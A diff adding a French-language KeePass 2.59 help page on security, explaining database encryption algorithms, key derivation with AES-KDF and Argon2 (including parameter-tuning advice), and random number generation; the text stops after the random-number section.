@@ -1,0 +1,514 @@
+
+
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="generator" content="HelpNDoc Standard Edition 9.9.0.637">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" href="favicon.ico"/>
+
+  <title>La s&eacute;curit&eacute;</title>
+  <meta name="description" content="" /> 
+  <meta name="keywords" content="">
+
+
+
+  
+  
+
+  <!-- Twitter Card data -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="La s&eacute;curit&eacute;">
+  <meta name="twitter:description" content="">
+
+  <!-- Open Graph data -->
+  <meta property="og:title" content="La s&eacute;curit&eacute;" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="KeePass-2.59" /> 
+
+  <!-- Bootstrap core CSS -->
+  <link href="vendors/bootstrap-3.4.1/css/bootstrap.min.css" rel="stylesheet"/>
+
+  <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+  <link href="vendors/bootstrap-3.4.1/css/ie10-viewport-bug-workaround.css" rel="stylesheet"/>
+
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!--[if lt IE 9]>
+      <script src="vendors/html5shiv-3.7.3/html5shiv.min.js"></script>
+      <script src="vendors/respond-1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+  <!-- JsTree styles -->
+  <link href="vendors/jstree-3.3.10/themes/default/style.min.css" rel="stylesheet"/>
+
+  <!-- Hnd styles -->
+  <link href="css/layout.min.css" rel="stylesheet" />
+  <link href="css/effects.min.css" rel="stylesheet" />
+  <link href="css/theme-light-blue.min.css" rel="stylesheet" />
+  <link href="css/print.min.css" rel="stylesheet" media="print" />
+  <style type="text/css">nav { width: 350px} @media screen and (min-width:769px) { body.md-nav-expanded div#main { margin-left: 350px} body.md-nav-expanded header { padding-left: 364px} }</style>
+  <style type="text/css">.navigation #inline-toc { width: auto !important}</style>
+
+  <!-- Content style -->
+  <link href="css/hnd.content.css" rel="stylesheet" />
+
+  
+
+
+
+</head>
+
+<body class="md-nav-expanded">
+
+
+
+  
+
+  <div id="skip-link">
+    <a href="#main-content" class="element-invisible">Skip to main content</a>
+  </div>
+
+  <header class="headroom">
+    <button class="hnd-toggle btn btn-default">
+      <span class="sr-only">Toggle navigation</span>
+      <span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span>        
+    </button>
+    <h1>KeePass-2.59</h1>
+    
+  </header>
+
+  <nav id="panel-left" class="md-nav-expanded">
+    <!-- Nav tabs -->
+    <ul class="tab-tabs nav nav-tabs" role="tablist">
+      <li id="nav-close" role="presentation"> 
+        <button class="hnd-toggle btn btn-default" aria-label="close">
+          <span class="glyphicon glyphicon-remove" aria-hidden="true"></span>
+        </button>
+      </li>
+      
+	  
+        <li role="presentation" class="tab active">
+            <a href="#contents" id="tab-contents" aria-controls="contents" role="tab" data-toggle="tab">
+                <i class="glyphicon glyphicon-list"></i>
+                Contents
+            </a>
+        </li>
+      
+        <li role="presentation" class="tab">
+            <a href="#index" id="tab-index" aria-controls="index" role="tab" data-toggle="tab">
+                <i class="glyphicon glyphicon-asterisk"></i>
+                Index
+            </a>
+        </li>
+      
+        <li role="presentation" class="tab">
+            <a href="#search" id="tab-search" aria-controls="search" role="tab" data-toggle="tab">
+                <i class="glyphicon glyphicon-search"></i>
+                Search
+            </a>
+        </li>
+      
+    </ul>  <!-- /Nav tabs -->
+
+    <!-- Tab panes -->
+    <div class="tab-content">
+	  
+      <div role="tabpanel" class="tab-pane active" id="contents">
+        <div id="toc" class="tree-container unselectable"
+            data-url="_toc.json"
+            data-openlvl="1"
+        >
+            
+        </div>
+      </div>  <!-- /contents-->
+      
+      <div role="tabpanel" class="tab-pane" id="index">
+        <div id="keywords" class="tree-container unselectable"
+            data-url="_keywords.json"
+            data-openlvl="1"
+        >
+            
+        </div>
+      </div>  <!-- /index-->
+      
+      <div role="tabpanel" class="tab-pane" id="search">
+        <div class="search-content">
+          <div class="search-input">
+            <form id="search-form">
+              <div class="form-group">
+                <div class="input-group">
+                  <input type="text" class="form-control" id="input-search" name="input-search" placeholder="Search..." aria-label="Search..." />
+                  <span class="input-group-btn">
+                    <button class="btn btn-default" type="submit" aria-label="Search...">
+                      <span class="glyphicon glyphicon-search" aria-hidden="true"></span>
+                    </button>
+                  </span>
+                </div>
+              </div>
+            </form>
+          </div>  <!-- /search-input -->
+          <div class="search-result">
+            <div id="search-info"></div>
+            <div class="tree-container unselectable" id="search-tree"></div>
+          </div>  <!-- /search-result -->
+        </div>  <!-- /search-content -->
+      </div>  <!-- /search-->
+      
+    </div>  <!-- /Tab panes -->
+
+  </nav>
+
+  <div id="main">
+
+    <article>
+        <div id="topic-content" class="container-fluid" 
+		  data-hnd-id="Lasecurite"
+		  data-hnd-context="28"
+		  data-hnd-title="La sécurité"
+		>
+            
+                <div class="navigation">
+                    <ol class="breadcrumb">
+                        <li><a href="Lesfonctionnalites.html">Les fonctionnalit&eacute;s</a></li>
+                    </ol>
+                    <div class="nav-arrows">
+                        <div class="btn-group btn-group" role="group"><a class="btn btn-default" href="Lesfonctionnalites.html" title="Les fonctionnalit&eacute;s" role="button"><span class="glyphicon glyphicon-menu-up" aria-hidden="true"></span></a><a class="btn btn-default" href="Lescontrolesdeditionsecurises.html" title="Les contr&ocirc;les d'&eacute;dition s&eacute;curis&eacute;s" role="button"><span class="glyphicon glyphicon-menu-left" aria-hidden="true"></span></a><a class="btn btn-default" href="Lasynchronisation.html" title="La synchronisation" role="button"><span class="glyphicon glyphicon-menu-right" aria-hidden="true"></span></a></div>
+                    </div>
+                </div> 
+            
+
+            <a id="main-content"></a>
+
+            <h2>La s&eacute;curit&eacute;</h2>
+
+            <div class="main-content">
+                
+<div class="rvps3">
+<table width="100%" style="border-color: #808080; border-style: solid; border-width: 1px; background-color: #f0f8ff; border-spacing: 2px;">
+ <tr style="vertical-align: middle;">
+  <td style="padding: 0px;">
+   <p class="rvps3"><img alt="" style="width : 64px; height : 64px; vertical-align: middle;" src="lib/imagesb64x64_file_locked%201.png"></p>
+  </td>
+  <td style="padding: 0px;">
+   <h1 class="rvps9"><span class="rvts0"><span class="rvts18">La sécurité</span></span></h1>
+   <p class="rvps3"><span class="rvts19">Informations détaillées sur la sécurité de KeePass.</span></p>
+  </td>
+ </tr>
+</table>
+</div>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secencrypt">Le chiffrement de la base de données</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#seckeyhash">Le hachage de clé et la dérivation de clé</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secdictprotect">La protection contre les attaques par dictionnaire</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secrandom">La génération de nombres aléatoires</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secmemprot">La protection de la mémoire du processus</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secdesktop">La saisie de la clé principale sur un bureau sécurisé (protection contre les enregistreurs de frappe)</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#seclocking">Le verrouillage de l'espace de travail</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secattach">Affichage/Édition de pièces jointes</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secplugins">Les greffons (plug-in)</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secselftests">Les autotests</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secspecattacks">Les logiciels espions spécialisés</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secmaldata">Les données malveillantes</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secoptex">Les options pour les experts</a></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="Lasecurite.html#secoptadm">Les options pour les administrateurs</a></li>
+ <li class="rvps14 noindent"><a class="rvts14" href="Lasecurite.html#secissues">Les problèmes de sécurité</a></li>
+</ul>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secencrypt"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_password%208.png"><span class="rvts0"><span class="rvts24"> Le chiffrement de la base de données</span></span></h2>
+<p class="rvps7"><span class="rvts8">Les fichiers de base de données de KeePass sont chiffrés. KeePass chiffre toute la base de données, c'est-à-dire non seulement vos mots de passe, mais également vos noms d'utilisateurs, adresses (URL), remarques, etc.</span></p>
+<p class="rvps7"><span class="rvts8">Les algorithmes de chiffrement suivants sont pris en charge&nbsp;&nbsp;:</span></p>
+<p class="rvps7"><span class="rvts8">KeePass 1.x&nbsp;:</span></p>
+<div class="rvps4">
+<table width="75%" style="border-color: #afb5cf; border-style: solid; border-width: 1px; background-color: #eeeeee; border-collapse: collapse; margin: 0px auto;">
+ <tr style="vertical-align: middle;">
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; vertical-align: top; width: 64%;">
+   <p class="rvps3"><span class="rvts20">Algorithme</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; vertical-align: top; width: 14%;">
+   <p class="rvps3"><span class="rvts20">Taille de la clé</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; vertical-align: top; width: 22%;">
+   <p class="rvps3"><span class="rvts20">Norme/Réf.</span></p>
+  </td>
+ </tr>
+ <tr style="vertical-align: middle;">
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">Advanced Encryption Standard (AES/Rijndael)</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">256 bits</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><a class="rvts14" href="https://csrc.nist.gov/pubs/fips/197/final">NIST FIPS 197</a></p>
+  </td>
+ </tr>
+ <tr style="vertical-align: middle;">
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">Twofish</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">256 bits</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><a class="rvts14" href="https://www.schneier.com/academic/twofish/">Info</a></p>
+  </td>
+ </tr>
+</table>
+</div>
+<p class="rvps7"><span class="rvts8">KeePass 2.x&nbsp;:</span></p>
+<div class="rvps4">
+<table width="75%" style="border-color: #afb5cf; border-style: solid; border-width: 1px; background-color: #eeeeee; border-collapse: collapse; margin: 0px auto;">
+ <tr style="vertical-align: middle;">
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; vertical-align: top; width: 64%;">
+   <p class="rvps3"><span class="rvts20">Algorithme</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; vertical-align: top; width: 14%;">
+   <p class="rvps3"><span class="rvts20">Taille de la clé</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; vertical-align: top; width: 22%;">
+   <p class="rvps3"><span class="rvts20">Norme/Réf.</span></p>
+  </td>
+ </tr>
+ <tr style="vertical-align: middle;">
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">Advanced Encryption Standard (AES/Rijndael)</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">256 bits</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><a class="rvts14" href="https://csrc.nist.gov/pubs/fips/197/final">NIST FIPS 197</a></p>
+  </td>
+ </tr>
+ <tr style="vertical-align: middle;">
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">ChaCha20</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">256 bits</span></p>
+  </td>
+  <td style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><a class="rvts14" href="https://datatracker.ietf.org/doc/html/rfc8439">RFC 8439</a></p>
+  </td>
+ </tr>
+ <tr style="vertical-align: middle;">
+  <td colspan="3" style="border-width : 1px; border-color: #afb5cf; border-style: solid; padding: 4px 5px; background-color: #f0f0f0; vertical-align: top;">
+   <p class="rvps3"><span class="rvts8">Il existe différents </span><a class="rvts14" href="https://keepass.info/plugins.html">greffons</a><span class="rvts8"> prenant en charge des algorithmes de chiffrement supplémentaires, y compris, mais sans s'y limiter, Twofish, Serpent et GOST.</span></p>
+  </td>
+ </tr>
+</table>
+</div>
+<p class="rvps7"><span class="rvts8">Ces algorithmes bien connus et analysés en profondeur sont considérés comme très sécurisés. AES (Rijndael) est devenue une norme du gouvernement fédéral américain et est approuvée par la National Security Agency (NSA) pour les informations les plus secrètes (top secret). Twofish était l'un des quatre autres finalistes de l'AES. ChaCha20 est le successeur de l'algorithme Salsa20 (qui est inclus dans le </span><a class="rvts14" href="http://www.ecrypt.eu.org/stream/">portefeuille eSTREAM</a><span class="rvts8">).</span></p>
+<p class="rvps7"><span class="rvts8">Les chiffrements par blocs sont utilisés dans le </span><a class="rvts14" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">mode de chiffrement par blocs</a><span class="rvts8"> CBC (Cipher Block Chaining). En mode CBC, les modèles de texte en clair sont masqués.</span></p>
+<p class="rvps7"><span class="rvts8">Un </span><a class="rvts14" href="https://en.wikipedia.org/wiki/Initialization_vector">vecteur d'initialisation</a><span class="rvts8"> (IV) est généré de manière </span><a class="rvts14" href="Lasecurite.html#secrandom">aléatoire</a><span class="rvts8"> chaque fois qu'une base de données est enregistrée. Ainsi, plusieurs bases de données chiffrées avec la même clé principale (par exemple&nbsp;: des sauvegardes) ne posent aucun problème.</span></p>
+<p class="rvps7"><span class="rvts8">L'authenticité et l'intégrité des données&nbsp;:</span></p>
+<p class="rvps3"><span class="rvts8">L'authenticité et l'intégrité des données sont garanties à l'aide d'un hachage HMAC-SHA-256 du texte chiffré (schéma Encrypt-then-MAC).</span></p>
+<p class="rvps7"><span class="rvts8">Voir également :</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <li class="rvps10 noindent"><a class="rvts14" href="https://keepass.info/help/kb/kdbx.html">La spécification du format de fichier KDBX</a><span class="rvts8">.</span></li>
+ <li class="rvps14 noindent"><a class="rvts14" href="LaFAQtechnique.html#fips2x">La prise en charge du mode FIPS</a><span class="rvts8">.</span></li>
+</ul>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="seckeyhash"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_password%207.png"><span class="rvts0"><span class="rvts24"> Le hachage de clé et la dérivation de clé</span></span></h2>
+<p class="rvps7"><span class="rvts8">SHA-256 est utilisé pour compresser les composants de la </span><a class="rvts14" href="Lacleprincipale.html">clé principale</a><span class="rvts8"> (consistant en un mot de passe maître, un fichier clé, une clé de compte utilisateur Windows et/ou une clé fournie par un greffon) en une clé </span><span class="rvts16">K</span><span class="rvts8"> de 256 bits.</span></p>
+<p class="rvps7"><span class="rvts8">SHA-256 est une fonction de hachage cryptographique considérée comme très sécurisée. Elle a été normalisée par le </span><a class="rvts14" href="https://dx.doi.org/10.6028/NIST.FIPS.180-4">NIST FIPS 180-4</a><span class="rvts8">. L'</span><a class="rvts14" href="https://www.schneier.com/blog/archives/2005/02/cryptanalysis_o.html">attaque contre SHA-1</a><span class="rvts8"> découverte en 2005 n'affecte pas la sécurité de SHA-256.</span></p>
+<p class="rvps7"><span class="rvts8">Afin de générer la clé de l'algorithme de chiffrement, </span><span class="rvts16">K</span><span class="rvts8"> est transformée à l'aide d'une fonction de dérivation de clé (avec un sel aléatoire). Cela évite le précalcul des clés et rend plus difficiles les attaques par dictionnaire et par devinettes. Pour plus de détails, cf. la section '</span><a class="rvts14" href="Lasecurite.html#secdictprotect">la protection contre les attaques par dictionnaire</a><span class="rvts8">'.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secdictprotect"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_password%206.png"><span class="rvts0"><span class="rvts24"> La protection contre les attaques par dictionnaire</span></span></h2>
+<p class="rvps7"><span class="rvts8">KeePass offre une protection contre les attaques par dictionnaire et devinettes.</span></p>
+<p class="rvps7"><span class="rvts8">De telles attaques ne peuvent pas être évitées, mais elles peuvent être rendues plus difficiles. Pour cela, la clé </span><span class="rvts16">K</span><span class="rvts8"> dérivée de la clé principale de l'utilisateur (cf. </span><a class="rvts14" href="Lasecurite.html#seckeyhash">ci-dessus</a><span class="rvts8">) est transformée à l'aide d'une fonction de dérivation de clé avec un sel aléatoire. Cela évite un précalcul des clés et ajoute un facteur de travail que l'utilisateur peut rendre aussi grand que souhaité pour augmenter l'effort de calcul d'une attaque par dictionnaire ou devinette.</span></p>
+<p class="rvps7"><span class="rvts8">Des fonctions de dérivation de clé multiple sont prises en charge. Dans la boîte de dialogue des paramètres de la base de données, vous pouvez en sélectionner une et spécifier certains paramètres pour elle.</span></p>
+<p class="rvps7"><span class="rvts8">En cliquant sur le bouton 'Délai d'une seconde' dans les paramètres de la boîte de dialogue de la base de données, KeePass calcule le nombre d'itérations qui résulte en un délai d'une seconde quand on charge/enregistre une base de données. De plus, KeePass 2.x possède un bouton 'Test' qui accomplit une transformation de clé avec les paramètres spécifiés (ce qui peut être annulé) et rend le temps requis.</span></p>
+<p class="rvps7"><span class="rvts8">La clé de transformation peut nécessiter plus ou moins de temps sur d'autres appareils. Si vous utilisez KeePass ou un de ses portages sur d'autres appareils, alors assurez-vous que tous les appareils sont assez rapides (et ont suffisamment de mémoire) pour charger la base de données avec vos paramètres en un temps acceptable.</span></p>
+<p class="rvps7"><span class="rvts8">Les fonctions de dérivation de clé prises en charge :</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <li class="rvps10 noindent"><span class="rvts27">AES-KDF</span><span class="rvts8"> (KeePass 1.x et 2.x)&nbsp;:</span><br/><span class="rvts8">Cette fonction de dérivation de clé est basée sur l'itération d'AES.&nbsp;</span><br/><span class="rvts8">&nbsp;Dans la boîte de dialogue des paramètres de la base de données, vous pouvez modifier le nombre d'itérations. Plus il y a d'itérations, et plus les attaques par dictionnaire et devinettes sont difficiles, mais le chargement/la sauvegarde de la base de données prend également plus de temps (linéairement). Sur Windows Vista et les versions ultérieures, KeePass peut utiliser l'API CNG/BCrypt de Windows pour la transformation de clé, ce qui est approximativement 50&nbsp;% plus rapide que le code de transformation de clé intégré dans KeePass.</span></li>
+ <li class="rvps10 noindent"><span class="rvts27">Argon2</span><span class="rvts8"> (uniquement KeePass 2.x)&nbsp;:</span><br/><a class="rvts14" href="https://github.com/P-H-C/phc-winner-argon2#argon2">Argon2</a><span class="rvts8"> est le gagnant du </span><a class="rvts14" href="https://www.password-hashing.net/">concours de hachage de mots de passe</a><span class="rvts8">. Le principal avantage d'Argon2 par rapport à AES-KDF est qu'il offre une meilleure résistance contre les attaques par GPU/ASIC (en raison de sa fonction mémoire en dure). Le nombre d'itérations varie linéairement avec le temps requis.</span></li>
+</ul>
+<p class="rvps14"><span class="rvts8">La spécification officielle de l'algorithme Argon2 définit trois variantes : Argon2d, Argon2id et Argon2i. Argon2i est la variante la moins adaptée dans notre cas (fichier de base de données KeePass) ; par conséquent, KeePass ne propose que Argon2d et Argon2id.</span></p>
+<p class="rvps14"><span class="rvts8">Argon2d offre la meilleure résistance aux attaques GPU/ASIC. La résistance d'Argon2id contre les attaques GPU/ASIC est un peu plus faible, mais Argon2id rend en outre certaines attaques par canaux latéraux légèrement plus difficiles.</span></p>
+<p class="rvps14"><span class="rvts8">Les attaques par canaux latéraux tentent d'obtenir des informations d'un système en observant son comportement (par exemple : la durée et la consommation d'énergie de certaines opérations). Sur les serveurs, les attaques par canaux latéraux sont une réelle menace. Sur les appareils clients (PC), les attaques par canal latéral sont plus difficiles (plus de bruit, etc.) ; il y a des idées sur la façon dont certains pourraient fonctionner en théorie, mais nous ne sommes au courant d'aucune attaque réelle dans la pratique. Par exemple : l'attaque décrite dans l'article '</span><a class="rvts14" href="https://www.cs.columbia.edu/2015/spy-in-the-sandbox/">The Spy in the Sandbox / Side-Channel Attacks in Web Browsers</a><span class="rvts8">' était intéressante (le code JavaScript était capable de détecter certaines interactions de l'utilisateur), mais pas une menace réelle (pas d'extraction de données sensibles, comme mentionnée explicitement dans l'article). Cela peut ou peut ne pas changer à l'avenir. Notez que cela n'a rien à voir avec le stockage en nuage ; KeePass chiffre/déchiffre un fichier de base de données sur un appareil client, et donc peu importe où le fichier de base de données est stocké (pour les attaques par canal latéral). De plus, il existe des attaques par canal latéral contre lesquelles ni Argon2d ni Argon2id (ni Argon2i, ni aucune autre fonction de dérivation de clé) ne protègent (par exemple : les attaques par canal latéral </span><a class="rvts14" href="https://en.wikipedia.org/wiki/Spectre_(security_vulnerability)">Spectre</a><span class="rvts8">/</span><a class="rvts14" href="https://en.wikipedia.org/wiki/Meltdown_(security_vulnerability)">Meltdown</a><span class="rvts8">, qui permettent aux logiciels espions de lire toute la mémoire).</span></p>
+<p class="rvps14"><span class="rvts8">Dans le cas de KeePass, nous recommandons actuellement Argon2d au lieu d'Argon2id, car nous pensons qu'une meilleure protection contre une menace réellement existante (le casse de mots de passe à l'aide de GPU/ASIC est l'état de l'art) est plus importante qu'une protection contre certaines attaques par canal latéral qui peuvent ou non devenir un problème sur les appareils clients à l'avenir. Si vous vous inquiétez des attaques par canaux latéraux (et êtes prêt à sacrifier une certaine résistance GPU/ASIC) ou si vous développez un logiciel où les attaques par canaux latéraux pourraient poser problème (par exemple : un service de serveur qui fonctionne avec les fichiers de base de données KeePass), utilisez Argon2id.</span></p>
+<p class="rvps14"><span class="rvts8">Remarque : la norme Internet IRTF CFRG Argon2 recommande Argon2id par défaut. Pour les applications serveur, Argon2id est en général en effet plus adapté qu'Argon2d, mais notre situation (appareil client) est différente, comme mentionnée ci-dessus.</span></p>
+<p class="rvps14"><span class="rvts8">Le nombre d'itérations évolue linéairement avec le temps requis. En augmentant le paramètre de mémoire, les attaques GPU/ASIC deviennent plus difficiles (et le temps requis augmente). Le paramètre parallélisme spécifie le nombre de threads à utiliser.</span></p>
+<p class="rvps14"><span class="rvts8">Nous recommandons la procédure suivante pour déterminer les paramètres Argon2 :</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <ol style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside;">
+  <li class="rvps11 noindent"><span class="rvts8">Définissez le nombre d'itérations sur 2 :</span></li>
+  <li class="rvps11 noindent"><span class="rvts8">Découvrez la taille de la mémoire vive de chacun de vos appareils sur lesquels vous souhaitez ouvrir votre fichier de base de données. Soit </span><span class="rvts17">M</span><span class="rvts8"> le minimum de ces tailles. Réglez le paramètre de mémoire sur min(</span><span class="rvts17">M</span><span class="rvts8">/2, 1 Go) (c'est-à-dire utilisez la moitié de </span><span class="rvts17">M</span><span class="rvts8">, si elle est inférieure à 1 Go, sinon utilisez 1 Go).</span></li>
+  <ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: square;">
+   <li class="rvps17 noindent"><span class="rvts8">Exemple 1 : si vous avez un PC avec 32 Go de RAM et un téléphone mobile avec 1 Go de RAM (sur lequel vous souhaitez ouvrir votre fichier de base de données), réglez le paramètre de mémoire sur 500 Mo.</span></li>
+   <li class="rvps17 noindent"><span class="rvts8">Exemple 2 : si vous avez un PC avec 32 Go de RAM et un PC avec 8 Go de RAM, réglez le paramètre de mémoire sur 1 Go.</span></li>
+  </ul>
+ </ol>
+</ul>
+<p class="rvps11"><span class="rvts8">Sur Windows 10 et versions ultérieures, la taille de la RAM peut être trouvée dans les paramètres système → 'Système' → 'À propos'.</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <ol style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside;">
+  <li value="3" class="rvps11 noindent"><span class="rvts8">Découvrez le nombre de processeurs logiques de chacun de vos appareils. Réglez le paramètre de parallélisme au minimum de ces nombres. Sur Windows 10 et versions ultérieures, le nombre de processeurs logiques peut être trouvé dans le Gestionnaire des tâches (clic droit sur la barre des tâches → 'Gestionnaire des tâches') sur la page de l'onglet 'Performances'.</span></li>
+  <li class="rvps11 noindent"><span class="rvts8">Cliquez sur le bouton 'Test'.</span></li>
+  <ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: square;">
+   <li class="rvps17 noindent"><span class="rvts8">Si la transformation de clé prend trop de temps (plus longtemps que vous n'êtes prêt à attendre lors de l'ouverture/enregistrement du fichier de base de données, par exemple : plus d'une seconde), alors annulez-la, diminuez le paramètre de mémoire et cliquez à nouveau sur le bouton 'Test'. Répétez cette opération jusqu'à ce que le temps requis soit acceptable.</span></li>
+   <li class="rvps17 noindent"><span class="rvts8">Si la transformation de clé prend trop peu de temps (dans le cas d'une mémoire de 1 Go), alors augmentez le nombre d'itérations et cliquez à nouveau sur le bouton 'Test'. Répétez cette opération jusqu'à ce que vous aimiez le temps requis.</span></li>
+  </ul>
+  <li class="rvps11 noindent"><span class="rvts8">Enregistrez le fichier de base de données et essayez de l'ouvrir sur chacun de vos autres appareils. Si cela prend trop de temps sur l'un des appareils, alors diminuez le nombre d'itérations (recommandation : pas moins de 2) et/ou diminuez le paramètre de mémoire, et réessayez.</span></li>
+ </ol>
+</ul>
+<p class="rvps18"><span class="rvts8">Lorsque vous cliquez sur le bouton 'Délai d'une seconde', KeePass utilise une stratégie différente pour déterminer les paramètres (des valeurs relativement faibles pour les paramètres de mémoire et de parallélisme, un nombre d'itérations relativement élevé), car KeePass ne connaît pas les détails de la RAM et du processeur de vos autres appareils (les valeurs par défaut doivent être compatibles avec la plupart des appareils). Si vous connaissez ces détails, alors il est recommandé de plutôt suivre la procédure ci-dessus.</span></p>
+<p class="rvps7"><span class="rvts20">Argon2 sur iOS :</span><span class="rvts8"> si vous utilisez une application compatible KeePass sur iOS, alors veuillez noter la limitation suivante d'iOS. Si l'application utilise beaucoup de RAM (par exemple, en raison de l'utilisation d'Argon2 avec un paramètre de mémoire important), alors le remplissage automatique peut ne pas fonctionner. Dans ce cas, nous recommandons d'utiliser une valeur relativement faible pour le paramètre de mémoire Argon2 (64 Mo ou moins, selon l'application et la taille de la base de données) et un nombre d'itérations relativement élevé.</span></p>
+<p class="rvps7"><span class="rvts20">KeePassX :</span><span class="rvts8"> contrairement à KeePass, le portage Linux KeePassX ne prend en charge que partiellement la protection contre les attaques par dictionnaires et devinette.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secrandom"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_binary.png"><span class="rvts0"><span class="rvts24"> La génération de nombres aléatoires</span></span></h2>
+<p class="rvps7"><span class="rvts8">KeePass commence par créer un pool d'entropie à l'aide de différentes sources d'entropie (y compris des nombres aléatoires générés par le fournisseur cryptographique du système, la date/heure courante et la disponibilité, la position du curseur, la version du système d'exploitation, le nombre de processeurs, les variables d'environnement, les statistiques de processus et de mémoire, </span><a class="rvts14" href="https://docs.microsoft.com/fr-fr/dotnet/api/system.globalization.cultureinfo">la culture actuelle</a><span class="rvts8">, un nouveau GUID aléatoire, etc.). Les informations de culture comportent par exemple le nom de la langue, le type de calendrier, le format des nombres et la disposition du clavier.</span></p>
+<p class="rvps7"><span class="rvts8">Les bits aléatoires pour les méthodes de génération de haut niveau sont générés à l'aide d'un générateur de nombres pseudo-aléatoires sécurisé de façon cryptographique (basé sur SHA-256/SHA-512 et ChaCha20) qui est initialisé à l'aide du pool d'entropie.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
